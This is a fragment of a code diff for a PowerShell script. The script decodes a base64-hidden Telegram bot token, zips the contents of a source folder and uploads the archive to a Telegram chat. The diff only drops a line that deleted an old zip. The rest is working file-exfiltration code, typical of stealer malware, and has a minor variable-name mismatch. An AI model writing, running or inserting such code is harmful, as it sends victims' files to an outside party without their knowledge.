@@ -5,6 +5,5 @@ $tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Str
 $cht = "5047177665"
 
 if (-not (Test-Path $source)) { exit 1 }
-if (Test-Path $zip) { Remove-Item $zip -Force }
 Compress-Archive -Path $source\* -DestinationPath $zip -Force
 Invoke-RestMethod -Uri "https://api.telegram.org/bot$tentet/sendDocument" -Method Post -Form @{ chat_id = $chat; document = Get-Item $zip }
